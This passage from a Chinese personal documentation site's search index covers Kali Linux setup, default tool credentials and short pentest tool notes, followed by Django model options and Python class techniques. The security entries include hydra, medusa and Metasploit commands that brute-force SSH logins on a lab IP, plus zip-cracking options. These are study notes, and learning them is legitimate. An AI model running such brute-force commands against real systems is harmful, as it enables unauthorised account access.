, 选择自己合适的版本下载即可，下载后，直接解压打开（需提前准备好环境如虚拟机） 默认账户密码: kali kali # 旧版本是 root 跟 toor 一些其他工具默认账密 BeEF-XSS: Username: beef Password: beef Configuration File: /etc/beef-xss/config.yaml MySQL: User: root Password: (blank) Setup Program: mysql_secure_installation OpenVAS: Username: admin Password: <Generated during setup> Setup Program: openvas-setup Metasploit-Framework: Username: postgres Password: postgres Configuration File: /usr/share/metasploit-framework/config/database.yml 参考： https://www.kali.org/docs/introduction/default-credentials/ 换源 # 备份 mv /etc/apt/sources.list /etc/apt/sources.list.bak # 写入 echo \"deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib \" >/etc/apt/sources.list 安装vim, ssh apt update apt install vim ssh 启动ssh # 或者 service ssh start /etc/init.d/ssh start # 可以通过 netstat -anutp 查看是否在监听22端口 # 设置开机启动 update-rc.d ssh enable","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-installation-configuration.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-installation-configuration.html"},{"title":"hydra","text":"暴力破解帐密 示例 # username存放在username.txt # password存放在pwd.txt # 以ssh形式破解192.168.135.123帐密 hydra -L username.txt -P pwd.txt 192 .168.135.123 ssh 注解 或者还是使用msfconsole msfconsole use auxiliary/scanner/ssh/ssh_login set RHOSTS 192 .168.135.123 set PASS_FILE password.txt set USER_FILE username.txt exploit 爆破ssh: hydra -L 用户名文件 -P 用户密码文件 IP地址 ssh","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Hydra.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Hydra.html"},{"title":"maltego","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Maltego.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Maltego.html"},{"title":"nc","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Nick-name.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Nick-name.html"},{"title":"tor","text":"使用代理伪装 需要先apt安装: apt install tor 配置文件在: /etc/proxychains4.conf","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Tor.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Tor.html"},{"title":"dirb","text":"服务目录扫描 示例 ┌── ( yanque㉿kali ) - [ ~ ] └─$ dirb http://www.coolshell.cn ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Mon Jan 2 17 :59:28 2023 URL_BASE: http://www.coolshell.cn/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://www.coolshell.cn/ ---- ( ! ) WARNING: NOT_FOUND [] not stable, unable to determine correct URLs { 30X } . ( Try using FineTunning: '-f' ) ----------------- END_TIME: Mon Jan 2 17 :59:29 2023 DOWNLOADED: 0 - FOUND: 0 ┌── ( yanque㉿kali ) - [ ~ ] └─$","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-dirb.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-dirb.html"},{"title":"exiftool","text":"查看文件注释","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-exifTool.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-exifTool.html"},{"title":"fcrackzip","text":"zip包的爆破 选项: -D ‘字典' 字典破解方式 -b 暴力破解方式 -c 暴力破解的字符类型，1=1~9,a=a~z,A=A~Z,!=字符,:=所有字符 -v 啰嗦模式，显示实时爆破信息 -l 指定破解的密码为几位数 -u 指定爆破文件 -p 破解的起始位置","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-fcrackzip.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-fcrackzip.html"},{"title":"medusa","text":"暴力破解帐密 示例 # password存放在pwd.txt # 以ssh形式破解192.168.135.123帐密 medusa -M ssh -h 192 .168.135.123 -u root -P pwd.txt","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-medusa.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-medusa.html"},{"title":"nikto","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nikto.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nikto.html"},{"title":"shodan","text":"IP地址信息收集","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-shodan.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-shodan.html"},{"title":"sqlmap","text":"渗透数据库","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-sqlmap.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-sqlmap.html"},{"title":"strings","text":"以字符串形式 查看图片","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-strings.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-strings.html"},{"title":"wfuzz","text":"爆破","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wFuzz.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wFuzz.html"},{"title":"whois","text":"域名注册信息收集 搜索 baidu.com 相关信息: ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ whois baidu.com Domain Name: BAIDU.COM Registry Domain ID: 11181110_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.markmonitor.com Registrar URL: http://www.markmonitor.com Updated Date: 2022-09-01T03:54:43Z Creation Date: 1999-10-11T11:05:17Z Registry Expiry Date: 2026-10-11T11:05:17Z Registrar: MarkMonitor Inc. Registrar IANA ID: 292 Registrar Abuse Contact Email: abusecomplaints@markmonitor.com Registrar Abuse Contact Phone: +1.2086851750 Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited Name Server: NS1.BAIDU.COM Name Server: NS2.BAIDU.COM Name Server: NS3.BAIDU.COM Name Server: NS4.BAIDU.COM Name Server: NS7.BAIDU.COM DNSSEC: unsigned ...","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-whois.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-whois.html"},{"title":"wpscan","text":"漏洞扫描","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wpscan.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-wpscan.html"},{"title":"Mac M1 Pro 安装 Kali","text":"下载地址 Kali Installer Kali 下载位置 安装 使用的工具是 Vmware Fusion 13 , 可以申请免费许可证使用. 注意安装的时候选择 Debain 即可. 选择 Debian 12 结束 安装过程略过, 一路点就行. 注意因为是安装器手动安装, 所以需要自己设置用户名与密码. 与以前 intel 直接下载虚拟机版本点开即用的方式不一样.","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Mac-M1-installation-Kali.html","loc":"/yq-doc-source-docs-Safety-kali-Mac-M1-installation-Kali.html"},{"title":"内部类Meta","text":"可用的选项 abstract abstract = True，表示这是一个 /docs/后端/python/Web框架/Django/抽象基类 app_label 如果在 INSTALLED_APPS 中定义了一个应用程序之外的模型，它必须声明它属于哪个应用程序: app_label = 'myapp' 如果你想用 app_label.object_name 或 app_label.model_name 来表示一个模型，你可以分别使用: model._meta.label 或 model._meta.label_lower db_table 用于模型的数据库表的名称 base_manager_name 管理器的属性名 管理器的属性名，例如，'objects'，用于模型的 _base_manager。 说实话 没懂 db_tablespace 数据库表空间名称 表空间（Tablespaces） | Django 文档 | Django (djangoproject.com) default_manager_name 模型的管理器名称 模型的 _default_manager 管理器名称。 default_related_name 从相关对象到这个对象的关系默认使用的名称。默认为 _set 。 这个选项还可以设置 related_query_name 由于字段的反向名称应该是唯一的，所以如果你打算对你的模型进行子类化，就要小心了。 为了避免名称冲突，名称的一部分应该包含 '%(app_label)s' 和 '%(model_name)s' ， 它们分别被模型所在的应用程序的名称和模型的名称所取代，都是小写的。 见 抽象模型的相关名称 段落。 get_latest_by 模型中的字段名或字段名列表 我的理解是 以这个字段集进行排序 managed 默认为True，表示Django 管理 数据库表的生命周期。 如果 False，将不对该模型进行数据库表的创建、修改或删除操作。 如果该模型代表一个现有的表或一个通过其他方式创建的数据库视图，这一点很有用。 这是在 managed=False 时 唯一 的区别。模型处理的所有其他方面都与正常情况完全相同。 order_with_respect_to 使该对象可以根据给定字段（通常是 ForeignKey ）进行排序。 ordering 对象的默认排序 permissions 表的额外权限 创建此对象时要输入权限表的额外权限。为每个模型自动创建添加、更改、删除和查看权限。 这个例子指定了一个额外的权限，can_deliver_pizzas permissions = [('can_deliver_pizzas', 'Can deliver pizzas')] 这是一个由二元元组组成的列表或元组，格式为 (permission_code, human_readable_permission_name)。 default_permissions 默认值为 ('add', 'change', 'delete', 'view') 。 你可以自定义这个列表，例如，如果你的应用不需要任何默认的权限，可以将其设置为空列表。 它必须在模型创建之前通过 migrate 在模型上指定，以防止任何遗漏的权限被创建。 proxy 如果 proxy = True ，作为另一个模型子类的模型将被视为 代理模型 required_db_features 当前连接应具备的数据库特征列表，以便在迁移阶段考虑模型。 例如，如果你将此列表设置为 ['gis_enabled']，则模型将只在支持 GIS 的数据库上同步。 在使用多个数据库后端进行测试时，跳过一些模型也很有用。避免模型之间的关系， 这些模型可能会被创建，也可能不会被创建，因为 ORM 不会处理这个问题。 required_db_vendor 本模型所特有的支持的数据库厂商名称。目前的内置厂商名称是： sqlite ， postgresql ， mysql 和 oracle 。 如果该属性不为空，且当前连接厂商与之不匹配，则该模型将不会同步。 select_on_save 确定 Django 是否会使用 1.6 之前的 django.db.models.Model.save() 算法. 旧的算法使用 SELECT 来确定是否有一条现有的记录需要更新。 新算法直接尝试 UPDATE 。在一些罕见的情况下，Django 看不到现有行的 UPDATE 。 例如 PostgreSQL 的 ON UPDATE 触发器会返回 NULL 。 在这种情况下，即使数据库中存在一条记录，新算法最终也会进行 INSERT 。 通常不需要设置这个属性。默认值是 False 。 关于新旧保存算法，请参见 django.db.models.Model.save() indexes 定义索引列表 如: from django.db import models class Customer(models.Model): first_name = models.CharField(max_length=100) last_name = models.CharField(max_length=100) class Meta: indexes = [ models.Index(fields=['last_name', 'first_name']), models.Index(fields=['first_name'], name='first_name_idx'), ] unique_together 一组字段名，组合起来必须是唯一的 index_together 可以理解为联合索引 constraints 表约束 verbose_name 对象的注释 单数 verbose_name_plural 对象的复数，默认是上一个加s label 对象的表示，返回 app_label.object_name，例如 'polls.Question'。 label_lower 模型的表示，返回 app_label.model_name，例如 'polls.question'。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Internal-class-meta.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Internal-class-meta.html"},{"title":"CharField","text":"一个字符串字段，适用于小到大的字符串。 对于大量的文本，使用 /docs/后端/python/Web框架/Django/支持的Field/TextField 该字段的默认表单部件是一个 TextInput。 CharField 有两个额外的参数： CharField.max_length 必须的。该字段的最大长度（以字符为单位）。 max_length 在数据库层面强制执行，在 Django 的验证中使用 MaxLengthValidator。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Charfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Charfield.html"},{"title":"FieldFile","text":"此节仅说明与FileField关系, 并不存在这样一个列, /docs/后端/python/Web框架/Django/支持的Field/FileField 和 FieldFile 当你访问一个模型上的 FileField 时，你会得到一个 FieldFile 的实例作为访问底层文件的代理: class FieldFile FieldFile 的 API 与 File 的 API 相同，但有一个关键的区别。 该类所封装的对象不一定是 Python 内置文件对象的封装 相反， 它是 Storage.open() 方法结果的封装，该方法可能是 File 对象，也可能是自定义存储对 File API 的实现。 除了从 File 继承的 API，如 read() 和 write() 之外，FieldFile 还包括一些可以用来与底层文件交互的方法： 警告 该类的两个方法 save() 和 delete()，默认为将与相关 FieldFile 的模型对象保存在数据库中。 FieldFile.name 文件名，包括从关联的 Storage 的根部开始的相对路径 FileField。 FieldFile.path 一个只读属性，通过调用底层的 path() 方法，访问文件的本地文件系统路径。 FieldFile.size 底层 Storage.size() 方法的结果。 FieldFile.url 一个只读属性，通过调用底层 Storage 类的 Storage() 方法来访问文件的相对 URL。 FieldFile.open(mode='rb') 以指定的 mode 打开或重新打开与该实例相关的文件。与标准的 Python open() 方法不同，它不返回一个文件描述符。 因为在访问底层文件时，底层文件是隐式打开的，所以除了重置底层文件的指针或改变 mode 之外，可能没有必要调用这个方法。 FieldFile.close() 类似于标准的 Python file.close() 方法，关闭与该实例相关的文件。 FieldFile.save(name, content, save=True) 这个方法接收一个文件名和文件内容，并将它们传递给字段的存储类，然后将存储的文件与模型字段关联。 如果你想手动将文件数据与模型上的 FileField 实例关联起来，那么 save() 方法用来持久化该文件数据。 取两个必要的参数。name 是文件的名称，content 是包含文件内容的对象。 可选的 save 参数控制在与该字段相关联的文件被更改后是否保存模型实例。默认为 True。 注解 content 参数应该是 django.core.files.File 的实例，而不是 Python 内置的文件对象。 你可以从现有的 Python 文件对象构造一个 File，像这样: from django.core.files import File Open an existing file using Python's built-in open() f = open('/path/to/hello.world') myfile = File(f) 或者你可以从 Python 字符串中构建一个像这样的字符串: from django.core.files.base import ContentFile myfile = ContentFile(\"hello world\") 更多信息，请参见 管理文件。 FieldFile.delete(save=True) 删除与此实例相关的文件，并清除字段的所有属性。 注意：如果在调用 delete() 时，文件恰好被打开，本方法将关闭该文件。 可选的 save 参数控制在删除与该字段相关的文件后是否保存模型实例。默认值为 True。 注解 当一个模型被删除时，相关文件不会被删除。 如果你需要清理遗留文件，你需要自己处理（例如，使用自定义管理命令，可以手动运行或通过例如 cron 定期运行）。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Fieldfile.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Fieldfile.html"},{"title":"类与对象","text":"主要关注点的是和类定义有关的常见编程模型。包括让对象支持常见的 Python 特性、特殊方法的使用、类封装技术、继承、内存管理以及有用的设计模式。 改变对象的字符串显示 想改变对象实例的打印或显示输出，让它们更具可读性 重新定义它的 __str__() 和 __repr__() 方法. repr__() 方法返回一个实例的代码表示形式，通常用来重新构造这个实例。 内置的 repr() 函数返回这个字符串，跟我们使用交互式解释器显示的值是一样的。 __str__() 方法将实例转换为一个字符串，使用 str() 或 print() 函数会输出这个字 符串: class Pair: def __init__(self, x, y): self.x = x self.y = y def __repr__(self): return 'Pair({0.x!r}, {0.y!r})'.format(self) def __str__(self): return '({0.x!s}, {0.y!s})'.format(self) 使用: >>> p = Pair(3, 4) >>> p Pair(3, 4) # __repr__() output >>> print(p) (3, 4) # __str__() output >>> 特别来讲，!r 格式化代码指明输出使用 __repr__() 来代替默认的 __str__(): >>> p = Pair(3, 4) >>> print('p is {0!r}'.format(p)) p is Pair(3, 4) >>> print('p is {0}'.format(p)) p is (3, 4) >>> 自定义 __repr__() 和 __str__() 通常是很好的习惯，因为它能简化调试和实例 输出。例如，如果仅仅只是打印输出或日志输出某个实例，那么程序员会看到实例更加 详细与有用的信息。 __repr__() 生成的文本字符串标准做法是需要让 eval(repr(x)) == x 为真。如 果实在不能这样子做，应该创建一个有用的文本表示，并使用 < 和 > 括起来。比如: >>> f = open('file.dat') >>> f <_io.TextIOWrapper name='file.dat' mode='r' encoding='UTF-8'> >>> 如果 __str__() 没有被定义，那么就会使用 __repr__() 来代替输出。 上面的 format() 方法的使用看上去很有趣，格式化代码 {0.x} 对应的是第 1 个 参数的 x 属性。因此，在下面的函数中，0 实际上指的就是 self 本身: def __repr__(self): return 'Pair({0.x!r}, {0.y!r})'.format(self) 也可以使用 % 操作符: 'Pair(%r, %r)' % (self.x, self.y) 自定义字符串的格式化 通过 format() 函数和字符串方法使得一个对象能支持自定义的格式化 需要在类上面定义 __format__() 方法 __format__() 方法给 Python 的字符串格式化功能提供了一个钩子。这里需要着 重强调的是格式化代码的解析工作完全由类自己决定。因此，格式化代码可以是任何 值 让对象支持上下文管理协议 想让你的对象支持上下文管理协议 (with 语句) with语句部分说明可见: /docs/后端/python/内置函数/with 需要实现 __enter__() 和 __exit__() 方法 编写上下文管理器的主要原理是你的代码会放到 with 语句块中执行。当出现 with 语句的时候，对象的 __enter__() 方法被触发，它返回的值 (如果有的话) 会被赋值给 as 声明的变量。然后，with 语句块里面的代码开始执行。最后，__exit__() 方法被触 发进行清理工作。 不管 with 代码块中发生什么，上面的控制流都会执行完，就算代码块中发生了异 常也是一样的。事实上，__exit__() 方法的第三个参数包含了异常类型、异常值和追 溯信息 (如果有的话)。__exit__() 方法能自己决定怎样利用这个异常信息，或者忽略 它并返回一个 None 值。如果 __exit__() 返回 True ，那么异常会被清空，就好像什 么都没发生一样，with 语句后面的程序继续在正常执行。 在 contextmanager 模块中有一个标准的上下文管理方案模板, 可参考 /docs/后端/python/python标准库/contextlib 创建大量对象时节省内存方法 要创建大量 (可能上百万) 的对象，导致占用很大的内存 对于主要是用来当成简单的数据结构的类而言，你可以通过给类添加 __slots__ 属性来极大的减少实例所占的内存。比如: class Date: __slots__ = ['year', 'month', 'day'] def __init__(self, year, month, day): self.year = year self.month = month self.day = day 当你定义 __slots__ 后，Python 就会为实例使用一种更加紧凑的内部表示。实 例通过一个很小的固定大小的数组来构建，而不是为每个实例定义一个字典，这跟元 组或列表很类似。在 __slots__ 中列出的属性名在内部被映射到这个数组的指定小标 上。使用 slots 一个不好的地方就是我们不能再给实例添加新的属性了，只能使用在 __slots__ 中定义的那些属性名。 其实就是, 内部字典只能有 __slots__ 定义的属性 尽管 slots 看上去是一个很有用的特性，很多时候你还是得减少对它的使用冲动。 Python 的很多特性都依赖于普通的基于字典的实现。另外，定义了 slots 后的类不再支 持一些普通类特性了，比如多继承。大多数情况下，你应该只在那些经常被使用到的用 作数据结构的类上定义 slots (比如在程序中需要创建某个类的几百万个实例对象)。 关于 __slots__ 的一个常见误区是它可以作为一个封装工具来防止用户给实例增 加新的属性。尽管使用 slots 可以达到这样的目的，但是这个并不是它的初衷。__slots__ 更多的是用来作为一个内存优化工具。 在类中封装属性名 单下划线前缀, 类私有属性(类似 java 的 protect) 双下划线前缀, 基类私有属性, 防止被继承(类似 java 的 privite) 单下划线后缀, 防止与保留关键字冲突. 注意, 这些仅是一种编码约定. 封装类的实例上面的\"私有\"数据，但是 Python 语言并没有访问控制。 Python 程序员不去依赖语言特性去封装数据，而是通过遵循一定的属性和方法命 名规约来达到这个效果。第一个约定是任何以单下划线 _ 开头的名字都应该是内部实 现。 同时还要注意到，使用下划线开头的约定同样适用于模块名和模 块级别函数。 使用双下划线开始会导致访问名称变成其他形式, 主要用于防止被继承. 有时候你定义的一个变量和某个保留关键字冲突，这时候可 以使用单下划线作为后缀. 创建可管理的属性 想给某个实例 attribute 增加除访问与修改之外的其他处理逻辑，比如类型检查或合法性验证。 使用 @property 装饰器. 注意对应的有 @xxx.setter : 赋值时触发 @xxx.deleter : del xxx 时触发 还能在已存在的 get 和 set 方法基础上定义 property。例如: class Person: def __init__(self, first_name): self.set_first_name(first_name) # Getter function def get_first_name(self): return self._first_name # Setter function def set_first_name(self, value): if not isinstance(value, str): raise TypeError('Expected a string') self._first_name = value # Deleter function (optional) def del_first_name(self): raise AttributeError(\"Can't delete attribute\") # Make a property from existing get/set methods name = property(get_first_name, set_first_name, del_first_name) 一个 property 属性其实就是一系列相关绑定方法的集合。如果你去查看拥有 property 的类，就会发现 property 本身的 fget、fset 和 fdel 属性就是类里面的普通方 法。比如: >>> Person.first_name.fget <function Person.first_name at 0x1006a60e0> >>> Person.first_name.fset <function Person.first_name at 0x1006a6170> >>> Person.first_name.fdel <function Person.first_name at 0x1006a62e0> >>> 通常来讲，你不会直接取调用 fget 或者 fset，它们会在访问 property 的时候自动 被触发。 只有当你确实需要对 attribute 执行其他额外的操作的时候才应该使用到 property。 有时候一些从其他编程语言 (比如 Java) 过来的程序员总认为所有访问都应该通过 getter 和 setter，所以他们认为代码应该像下面这样写(比如我之前就是): class Person: def __init__(self, first_name): self.first_name = first_name @property def first_name(self): return self._first_name @first_name.setter def first_name(self, value): self._first_name = value 不要写这种没有做任何其他额外操作的 property。首先，它会让你的代码变得很臃 肿，并且还会迷惑阅读者。其次，它还会让你的程序运行起来变慢很多。最后，这样的设 计并没有带来任何的好处。 调用父类方法 想在子类中调用父类的某个已经被覆盖的方法。 使用 super() 函数, 可参考: /docs/后端/python/概念相关/对super的理解 class A: def spam(self): print('A.spam') class B(A): def spam(self): print('B.spam') super().spam() # Call parent spam() super() 函数的一个常见用法是在 __init__() 方法中确保父类被正确的初始化了 对于你 定义的每一个类，Python 会计算出一个所谓的方法解析顺序 (MRO) 列表。这个 MRO 列表就是一个简单的所有基类的线性顺序表。例如: >>> C.__mro__ (<class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class '__main__.Base'>, <class 'object'>) >>> 为了实现继承，Python 会在 MRO 列表上从左到右开始查找基类，直到找到第一 个匹配这个属性的类为止。 而这个 MRO 列表的构造是通过一个 C3 线性化算法来实现的。我们不去深究这个 算法的数学原理，它实际上就是合并所有父类的 MRO 列表并遵循如下三条准则： 子类会先于父类被检查 多个父类会根据它们在列表中的顺序被检查 如果对下一个类存在两个合法的选择，选择第一个父类 然而，由于 super() 可能会调用不是你想要的方法，你应该遵循一些通用原则。首 先，确保在继承体系中所有相同名字的方法拥有可兼容的参数签名 (比如相同的参数个 数和参数名称)。这样可以确保 super() 调用一个非直接父类方法时不会出错。其次， 最好确保最顶层的类提供了这个方法的实现，这样的话在 MRO 上面的查找链肯定可 以找到某个确定的方法 子类中扩展 property 创建新的类或实例属性 创建一个新的拥有一些额外功能的实例属性类型，比如类型检查 如果你想创建一个全新的实例属性，可以通过一个描述器类的形式来定义它的功 能。下面是一个例子: # Descriptor attribute for an integer type-checked attribute class Integer: def __init__(self, name): self.name = name def __get__(self, instance, cls): if instance is None: return self else: return instance.__dict__[self.name] def __set__(self, instance, value): if not isinstance(value, int): raise TypeError('Expected an int') instance.__dict__[self.name] = value def __delete__(self, instance): del instance.__dict__[self.name] 一个描述器就是一个实现了三个核心的属性访问操作 (get, set, delete) 的类，分别 为 __get__() 、__set__() 和 __delete__() 这三个特殊的方法。这些方法接受一个实 例作为输入，之后相应的操作实例底层的字典 为了使用一个描述器，需将这个描述器的实例作为类属性放到一个类的定义中。例 如: class Point: x = Integer('x') y = Integer('y') def __init__(self, x, y): self.x = x self.y = y 当你这样做后，所有对描述器属性 (比如 x 或 y) 的访问会被 __get__() 、__set__() 和 __delete__() 方法捕获到。例如: >>> p = Point(2, 3) >>> p.x # Calls Point.x.__get__(p,Point) 2 >>> p.y = 5 # Calls Point.y.__set__(p, 5) >>> p.x = 2.3 # Calls Point.x.__set__(p, 2.3) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"descrip.py\", line 12, in __set__ raise TypeError('Expected an int') TypeError: Expected an int >>> 作为输入，描述器的每一个方法会接受一个操作实例。为了实现请求操作，会相应 的操作实例底层的字典 (__dict__ 属性)。描述器的 self.name 属性存储了在实例字 典中被实际使用到的 key。 描述器可实现大部分 Python 类特性中的底层魔法，包括 @classmethod 、 @staticmethod 、@property ，甚至是 __slots__ 特性。 通过定义一个描述器，你可以在底层捕获核心的实例操作 (get, set, delete)，并且 可完全自定义它们的行为。这是一个强大的工具，有了它你可以实现很多高级功能，并 且它也是很多高级库和框架中的重要工具之一。 描述器的一个比较困惑的地方是它只能在类级别被定义，而不能为每个实例单独 定义。因此，下面的代码是无法工作的: # Does NOT work class Point: def __init__(self, x, y): self.x = Integer('x') # No! Must be a class variable self.y = Integer('y') self.x = x self.y = y __get__() 看上去有点复杂的原因归结于实例变量和类变量的不同。如果一个描述 器被当做一个类变量来访问，那么 instance 参数被设置成 None 。这种情况下，标准做 法就是简单的返回这个描述器本身即可 (尽管你还可以添加其他的自定义操作): >>> p = Point(2,3) >>> p.x # Calls Point.x.__get__(p, Point) 2 >>> Point.x # Calls Point.x.__get__(None, Point) <__main__.Integer object at 0x100671890> >>> 使用延迟计算属性 将一个只读属性定义成一个 property，并且只在访问的时候才会计算结果。但 是一旦被访问后，你希望结果值被缓存起来，不用每次都去计算。 一般自己实现都是使用的预定义类变量的形式. 也可以使用类装饰器的形式实现: class lazyproperty: def __init__(self, func): self.func = func def __get__(self, instance, cls): if instance is None: return self else: value = self.func(instance) # 主要是这一句设置值 setattr(instance, self.func.__name__, value) return value 使用: import math class Circle: def __init__(self, radius): self.radius = radius @lazyproperty def area(self): print('Computing area') return math.pi * self.radius ** 2 @lazyproperty def perimeter(self): print('Computing perimeter') return 2 * math.pi * self.radius 交互环境中演示: >>> c = Circle(4.0) >>> c.radius 4.0 >>> c.area Computing area 50.26548245743669 >>> c.area 50.26548245743669 >>> c.perimeter Computing perimeter 25.132741228718345 >>> c.perimeter 25.132741228718345 >>> 当一个描述器被放入一个类的定义时， 每次访问属性时它的 __get__() 、__set__() 和 __delete__() 方法就会被触发。不过， 如果一个描述器仅仅只定义了一个 __get__() 方法的话，它比通常的具有更弱的绑定。 特别地， 只有当被访问属性不在实例底层的字典中时 __get__() 方法才会被触发。 简化数据结构的初始化 你写了很多仅仅用作数据结构的类，不想写太多烦人的 __init__() 函数 可以在一个基类中写一个公用的 __init__() 函数, 然后使你的类继承自这个基类. 注意设置值可以使用 setattr或__dict__ [setattr(self, name, name) for name in args] self.__dict__.update(zip(args)) 使用dict时, 尽管也可以正常工作，但是当定义子类的时候问题就来了。当一个子类定义了 __slots__ 或者通过 property(或描述器) 来包装某个属性，那么直接访问实例字典就 不起作用了。 这种方法唯一不好的地方就是对某些 IDE 而言，在显示帮助函数时可能不太友好。 定义接口或者抽象基类 想定义一个接口或抽象类， 并且通过执行类型检查来确保子类实现了某些特定的方法 使用 abc 模块可以很轻松的定义抽象基类: from abc import ABCMeta, abstractmethod class IStream(metaclass=ABCMeta): @abstractmethod def read(self, maxbytes=-1): pass @abstractmethod def write(self, data): pass 抽象类的一个特点是它不能直接被实例化，比如你想像下面这样做是不行的: a = IStream() # TypeError: Can't instantiate abstract class # IStream with abstract methods read, write 抽象类的目的就是让别的类继承它并实现特定的抽象方法 class SocketStream(IStream): def read(self, maxbytes=-1): pass def write(self, data): pass 抽象基类的一个主要用途是在代码中检查某些类是否为特定类型，实现了特定接口: def serialize(obj, stream): if not isinstance(stream, IStream): raise TypeError('Expected an IStream') pass 除了继承这种方式外，还可以通过注册方式来让某个类实现抽象基类: import io # Register the built-in I/O classes as supporting our interface IStream.register(io.IOBase) # Open a normal file and type check f = open('foo.txt') isinstance(f, IStream) # Returns True @abstractmethod 还能注解静态方法、类方法和 properties 。你只需保证这个注解紧靠在函数定义前即可: class A(metaclass=ABCMeta): @property @abstractmethod def name(self): pass @name.setter @abstractmethod def name(self, value): pass @classmethod @abstractmethod def method1(cls): pass @staticmethod @abstractmethod def method2(): pass 标准库中有很多用到抽象基类的地方。collections 模块定义了很多跟容器和迭 代器 (序列、映射、集合等) 有关的抽象基类。numbers 库定义了跟数字对象 (整数、浮 点数、有理数等) 有关的基类。io 库定义了很多跟 I/O 操作相关的基类。 可以使用预定义的抽象类来执行更通用的类型检查: import collections # Check if x is a sequence if isinstance(x, collections.Sequence): ... # Check if x is iterable if isinstance(x, collections.Iterable): ... # Check if x has a size if isinstance(x, collections.Sized): ... # Check if x is a mapping if isinstance(x, collections.Mapping): ... 尽管 ABCs 可以让我们很方便的做类型检查，但是我们在代码中最好不要过多的 使用它。因为 Python 的本质是一门动态编程语言，其目的就是给你更多灵活性，强制 类型检查或让你代码变得更复杂，这样做无异于舍本求末。 实现数据模型的类型约束 定义某些在属性赋值上面有限制的数据结构。 实现自定义容器 想实现一个自定义的类来模拟内置的容器类功能，比如列表和字典。但是你不确 定到底要实现哪些方法 collections 定义了很多抽象基类，当你想自定义容器类的时候它们会非常有用。 比如你想让你的类支持迭代，那就让你的类继承 collections.Iterable. 不过你需要实现 collections.Iterable 所有的抽象方法，否则会报错. 使用 collections 中的抽象基类可以确保你自定义的容器实现了所有必要的方法。 并且还能简化类型检查。 属性的代理访问 想将某个实例的属性访问代理到内部另一个实例中去，目的可能是作为继承的 一个替代方法或者实现代理模式。 简单来说，代理是一种编程模式，它将某个操作转移给另外一个对象来实现。最简 单的形式可能是像下面这样: class A: def spam(self, x): pass def foo(self): pass class B1: \"\"\" 简单的代理\"\"\" def __init__(self): self._a = A() def spam(self, x): # Delegate to the internal self._a instance return self._a.spam(x) def foo(self): # Delegate to the internal self._a instance return self._a.foo() def bar(self): pass 如果仅仅就两个方法需要代理，那么像这样写就足够了。但是，如果有大量的方法 需要代理，那么使用 __getattr__() 方法或许或更好些: def __getattr__(self, name): \"\"\" 这个方法在访问的 attribute 不存在的时候被调用 the __getattr__() method is actually a fallback method that only gets called when an attribute is not found\"\"\" return getattr(self._a, name) __getattr__ 方法是在访问 attribute 不存在的时候被调用 